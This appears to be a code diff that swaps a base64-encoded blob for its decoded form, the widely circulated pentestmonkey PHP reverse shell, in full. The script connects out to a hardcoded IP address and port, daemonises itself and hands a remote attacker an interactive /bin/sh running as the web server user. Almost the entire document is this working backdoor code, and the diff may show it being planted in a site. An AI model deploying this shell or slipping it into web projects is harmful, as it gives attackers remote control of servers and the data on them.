@@ -1,1 +1,192 @@
-PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRpb24gaW4gUEhQCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0Ci8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25seS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVyZm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIFRoZSBhdXRob3IgYWNjZXB0cyBubyBsaWFiaWxpdHkKLy8gZm9yIGRhbWFnZSBjYXVzZWQgYnkgdGhpcyB0b29sLiAgSWYgdGhlc2UgdGVybXMgYXJlIG5vdCBhY2NlcHRhYmxlIHRvIHlvdSwgdGhlbgovLyBkbyBub3QgdXNlIHRoaXMgdG9vbC4KLy8KLy8gSW4gYWxsIG90aGVyIHJlc3BlY3RzIHRoZSBHUEwgdmVyc2lvbiAyIGFwcGxpZXM6Ci8vCi8vIFRoaXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOyB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5Ci8vIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgdmVyc2lvbiAyIGFzCi8vIHB1Ymxpc2hlZCBieSB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLgovLwovLyBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKLy8gYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKLy8gTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQovLyBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgovLwovLyBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhbG9uZwovLyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBJbmMuLAovLyA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24sIE1BIDAyMTEwLTEzMDEgVVNBLgovLwovLyBUaGlzIHRvb2wgbWF5IGJlIHVzZWQgZm9yIGxlZ2FsIHB1cnBvc2VzIG9ubHkuICBVc2VycyB0YWtlIGZ1bGwgcmVzcG9uc2liaWxpdHkKLy8gZm9yIGFueSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUgbm90IGFjY2VwdGFibGUgdG8KLy8geW91LCB0aGVuIGRvIG5vdCB1c2UgdGhpcyB0b29sLgovLwovLyBZb3UgYXJlIGVuY291cmFnZWQgdG8gc2VuZCBjb21tZW50cywgaW1wcm92ZW1lbnRzIG9yIHN1Z2dlc3Rpb25zIHRvCi8vIG1lIGF0IHBlbnRlc3Rtb25rZXlAcGVudGVzdG1vbmtleS5uZXQKLy8KLy8gRGVzY3JpcHRpb24KLy8gLS0tLS0tLS0tLS0KLy8gVGhpcyBzY3JpcHQgd2lsbCBtYWtlIGFuIG91dGJvdW5kIFRDUCBjb25uZWN0aW9uIHRvIGEgaGFyZGNvZGVkIElQIGFuZCBwb3J0LgovLyBUaGUgcmVjaXBpZW50IHdpbGwgYmUgZ2l2ZW4gYSBzaGVsbCBydW5uaW5nIGFzIHRoZSBjdXJyZW50IHVzZXIgKGFwYWNoZSBub3JtYWxseSkuCi8vCi8vIExpbWl0YXRpb25zCi8vIC0tLS0tLS0tLS0tCi8vIHByb2Nfb3BlbiBhbmQgc3RyZWFtX3NldF9ibG9ja2luZyByZXF1aXJlIFBIUCB2ZXJzaW9uIDQuMyssIG9yIDUrCi8vIFVzZSBvZiBzdHJlYW1fc2VsZWN0KCkgb24gZmlsZSBkZXNjcmlwdG9ycyByZXR1cm5lZCBieSBwcm9jX29wZW4oKSB3aWxsIGZhaWwgYW5kIHJldHVybiBGQUxTRSB1bmRlciBXaW5kb3dzLgovLyBTb21lIGNvbXBpbGUtdGltZSBvcHRpb25zIGFyZSBuZWVkZWQgZm9yIGRhZW1vbmlzYXRpb24gKGxpa2UgcGNudGwsIHBvc2l4KS4gIFRoZXNlIGFyZSByYXJlbHkgYXZhaWxhYmxlLgovLwovLyBVc2FnZQovLyAtLS0tLQovLyBTZWUgaHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L3Rvb2xzL3BocC1yZXZlcnNlLXNoZWxsIGlmIHlvdSBnZXQgc3R1Y2suCgpzZXRfdGltZV9saW1pdCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICcyMDYuMTg5LjIxNS41Mic7ICAvLyBDSEFOR0UgVEhJUwokcG9ydCA9IDEyMzQ1OyAgICAgICAvLyBDSEFOR0UgVEhJUwokY2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CgovLwovLyBEYWVtb25pc2Ugb3Vyc2VsZiBpZiBwb3NzaWJsZSB0byBhdm9pZCB6b21iaWVzIGxhdGVyCi8vCgovLyBwY250bF9mb3JrIGlzIGhhcmRseSBldmVyIGF2YWlsYWJsZSwgYnV0IHdpbGwgYWxsb3cgdXMgdG8gZGFlbW9uaXNlCi8vIG91ciBwaHAgcHJvY2VzcyBhbmQgYXZvaWQgem9tYmllcy4gIFdvcnRoIGEgdHJ5Li4uCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJLy8gRm9yayBhbmQgaGF2ZSB0aGUgcGFyZW50IHByb2Nlc3MgZXhpdAoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCQoJaWYgKCRwaWQgPT0gLTEpIHsKCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwoJCWV4aXQoMSk7Cgl9CgkKCWlmICgkcGlkKSB7CgkJZXhpdCgwKTsgIC8vIFBhcmVudCBleGl0cwoJfQoKCS8vIE1ha2UgdGhlIGN1cnJlbnQgcHJvY2VzcyBhIHNlc3Npb24gbGVhZGVyCgkvLyBXaWxsIG9ubHkgc3VjY2VlZCBpZiB3ZSBmb3JrZWQKCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgewoJCXByaW50aXQoIkVycm9yOiBDYW4ndCBzZXRzaWQoKSIpOwoJCWV4aXQoMSk7Cgl9CgoJJGRhZW1vbiA9IDE7Cn0gZWxzZSB7CglwcmludGl0KCJXQVJOSU5HOiBGYWlsZWQgdG8gZGFlbW9uaXNlLiAgVGhpcyBpcyBxdWl0ZSBjb21tb24gYW5kIG5vdCBmYXRhbC4iKTsKfQoKLy8gQ2hhbmdlIHRvIGEgc2FmZSBkaXJlY3RvcnkKY2hkaXIoIi8iKTsKCi8vIFJlbW92ZSBhbnkgdW1hc2sgd2UgaW5oZXJpdGVkCnVtYXNrKDApOwoKLy8KLy8gRG8gdGhlIHJldmVyc2Ugc2hlbGwuLi4KLy8KCi8vIE9wZW4gcmV2ZXJzZSBjb25uZWN0aW9uCiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CgovLyBTcGF3biBzaGVsbCBwcm9jZXNzCiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwoKJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CgppZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewoJcHJpbnRpdCgiRVJST1I6IENhbid0IHNwYXduIHNoZWxsIik7CglleGl0KDEpOwp9CgovLyBTZXQgZXZlcnl0aGluZyB0byBub24tYmxvY2tpbmcKLy8gUmVhc29uOiBPY2NzaW9uYWxseSByZWFkcyB3aWxsIGJsb2NrLCBldmVuIHRob3VnaCBzdHJlYW1fc2VsZWN0IHRlbGxzIHVzIHRoZXkgd29uJ3QKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJLy8gQ2hlY2sgZm9yIGVuZCBvZiBUQ1AgY29ubmVjdGlvbgoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCS8vIENoZWNrIGZvciBlbmQgb2YgU1RET1VUCglpZiAoZmVvZigkcGlwZXNbMV0pKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCS8vIFdhaXQgdW50aWwgYSBjb21tYW5kIGlzIGVuZCBkb3duICRzb2NrLCBvciBzb21lCgkvLyBjb21tYW5kIG91dHB1dCBpcyBhdmFpbGFibGUgb24gU1RET1VUIG9yIFNUREVSUgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBUQ1Agc29ja2V0LCBzZW5kCgkvLyBkYXRhIHRvIHByb2Nlc3MncyBTVERJTgoJaWYgKGluX2FycmF5KCRzb2NrLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRzb2NrLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSzogJGlucHV0Iik7CgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RET1VUCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1sxXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERFUlIKCS8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0aW9uCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKLy8gTGlrZSBwcmludCwgYnV0IGRvZXMgbm90aGluZyBpZiB3ZSd2ZSBkYWVtb25pc2VkIG91cnNlbGYKLy8gKEkgY2FuJ3QgZmlndXJlIG91dCBob3cgdG8gcmVkaXJlY3QgU1RET1VUIGxpa2UgYSBwcm9wZXIgZGFlbW9uKQpmdW5jdGlvbiBwcmludGl0ICgkc3RyaW5nKSB7CglpZiAoISRkYWVtb24pIHsKCQlwcmludCAiJHN0cmluZ1xuIjsKCX0KfQoKPz4g
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '206.189.215.52';  // CHANGE THIS
+$port = 12345;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+
+
+
